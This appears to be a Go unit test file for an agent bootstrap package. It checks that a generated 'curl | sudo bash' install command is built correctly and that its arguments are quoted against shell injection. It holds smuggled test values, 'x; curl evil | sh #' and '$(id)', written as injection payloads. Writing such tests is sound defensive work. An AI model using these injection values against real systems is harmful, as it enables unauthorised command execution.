package bootstrap

import (
	"strings"
	"testing"
)

func TestBuildInstallCommand_LegacyWhenHashEmpty(t *testing.T) {
	t.Parallel()
	cmd := BuildInstallCommand(InstallCommandInput{
		ScriptURL:  "https://example.com/install.sh",
		ScriptHash: "",
		Token:      "tok",
		AgentID:    "agent-1",
		ListenAddr: ":8443",
		PanelCAPin: "sha256:fakepin",
		PanelCN:    "panel.example.com",
		PanelURL:   "panel.example.com:8443",
	})
	wantLegacy := []string{
		"curl -fsSL 'https://example.com/install.sh'",
		"| sudo bash -s --",
		"--mode=reverse",
		"--bootstrap-token='tok'",
		"--agent-id='agent-1'",
	}
	for _, p := range wantLegacy {
		if !strings.Contains(cmd, p) {
			t.Errorf("legacy command missing %q\ncmd=%s", p, cmd)
		}
	}
	// None of the pinned-branch markers should appear when verification
	// is disabled — they are meaningful only with a non-empty ScriptHash.
	forbidden := []string{
		"mktemp",
		"sha256sum",
		"PANVEX_INSTALL_SCRIPT_SHA256",
		"sudo -E",
	}
	for _, p := range forbidden {
		if strings.Contains(cmd, p) {
			t.Errorf("legacy command unexpectedly contains pinned marker %q\ncmd=%s", p, cmd)
		}
	}
}

func TestBuildInstallCommandQuotesAgainstInjection(t *testing.T) {
	t.Parallel()
	const evilPanel = "x; curl evil | sh #"
	cmd := BuildInstallCommand(InstallCommandInput{
		ScriptURL:  "http://h/$(id)",
		ScriptHash: strings.Repeat("a", 64),
		Token:      "tok",
		AgentID:    "agent-1",
		ListenAddr: ":8443",
		PanelCAPin: "sha256:fakepin",
		PanelCN:    "panel.example.com",
		PanelURL:   evilPanel,
	})

	// The dangerous value must appear wrapped in single quotes...
	if !strings.Contains(cmd, "--panel-url-grpc='"+evilPanel+"'") {
		t.Errorf("panel URL not single-quoted\ncmd=%s", cmd)
	}
	// ...and never as a bare, shell-active substring.
	if strings.Contains(cmd, "--panel-url-grpc=x; curl") {
		t.Errorf("panel URL renders unquoted — shell injection possible\ncmd=%s", cmd)
	}
	// The script URL's `$(id)` must be quoted so the operator's shell does
	// not command-substitute it.
	if !strings.Contains(cmd, "curl -fsSL 'http://h/$(id)'") {
		t.Errorf("script URL not single-quoted\ncmd=%s", cmd)
	}

	// A benign value still renders, in its now-quoted form.
	benign := BuildInstallCommand(InstallCommandInput{
		ScriptURL:  "https://example.com/install.sh",
		ScriptHash: strings.Repeat("a", 64),
		Token:      "tok",
		AgentID:    "agent-1",
		ListenAddr: ":8443",
		PanelCAPin: "sha256:fakepin",
		PanelCN:    "panel.example.com",
		PanelURL:   "grpc.example:8443",
	})
	if !strings.Contains(benign, "--panel-url-grpc='grpc.example:8443'") {
		t.Errorf("benign panel URL not rendered in quoted form\ncmd=%s", benign)
	}
}
